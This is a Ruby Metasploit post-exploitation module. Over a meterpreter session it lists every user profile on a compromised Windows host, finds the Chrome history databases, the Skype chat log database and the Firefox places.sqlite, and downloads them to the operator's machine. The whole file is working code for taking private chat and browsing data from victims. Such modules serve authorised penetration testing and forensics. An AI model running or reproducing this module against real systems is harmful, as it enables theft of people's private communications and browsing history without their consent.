##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'csv'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/post/windows/registry'


class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Registry

  STORE_FILE_TYPE = 'binary/db'

  def initialize(info={})
    super( update_info( info,
        'Name' => 'Windows Gather Skype, Firefox, and Chrome Artifacts',
        'Description' => %q{
          Gathers Skype chat logs, Firefox history, and Chrome history data from the target machine.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Joshua Harper <josh[at]radixtx.com>' # @JonValt
        ],
        'Platform' => %w{ win },
        'SessionTypes' => [ 'meterpreter' ]
      ))
  end

  #
  # Execute the module.
  #
  def run
    print_status("Gathering user profiles")

    files_to_gather = [
      { :path => 'LocalAppData', :name => "Chrome History", :dir => "Google", :fname => "History." },
      { :path => 'LocalAppData', :name => "Chrome Archived History", :dir => "Google", :fname => "Archived History." },
      { :path => 'AppData', :name => 'Skype', :dir => 'Skype', :fname => "main.db" },
      { :path => 'AppData', :name => "Firefox", :dir => "Mozilla", :fname => "places.sqlite" }
    ]

    grab_user_profiles.each do |userprofile|
      files_to_gather.each { |f| download_artifact(userprofile, f) }
    end
  end

  #
  # Check to see if the artifact exists on the remote system.
  #
  def check_artifact(profile, opts={})
    path = profile[opts[:path]]
    dir = opts[:dir]

    dirs = session.fs.dir.foreach(path).collect

    return dirs.include? dir
  end

  #
  # Download the artifact from the remote system if it exists.
  #
  def download_artifact(profile, opts={})
    name = opts[:name]

    print_status("Checking for #{name} artifacts...")
    if !check_artifact(profile, opts)
      print_error("#{name} directory not found for #{profile['UserName']}")
      return false
    end

    print_good("#{name} directory found #{profile['UserName']}")

    fname = opts[:fname]
    dir = opts[:dir]
    path = opts[:path]

    artifact_path = "#{profile[path]}\\#{dir}"
    file = session.fs.file.search(artifact_path, "#{fname}", true)

    return false unless file

    file.each do |db|
      guid = db['path'].split('\\')
      # Using store_local for full control of output filename. Forensics software can be picky about the files it's given.
      local_loc = "#{profile['UserName']}_#{name}_#{guid.last}_#{fname}"
      file_loc = store_local("artifact", STORE_FILE_TYPE, session, local_loc)
      maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
      print_status("Downloading #{maindb}")
      session.fs.file.download_file(file_loc, maindb)
      print_good("#{name} artifact file saved to #{file_loc}")
    end
    return true
  end
end
